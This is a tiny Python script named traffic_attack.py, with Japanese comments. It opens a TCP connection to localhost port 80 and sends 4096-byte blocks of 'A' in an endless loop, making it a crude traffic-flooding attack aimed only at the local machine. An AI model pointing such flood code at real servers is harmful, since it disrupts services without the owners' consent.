# traffic_attack.py
import socket

target = ("127.0.0.1", 80)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect(target)
    while True:
        sock.send(b"A" * 4096)  # 大量送信
except Exception as e:
    print("終了:", e)
finally:
    sock.close()
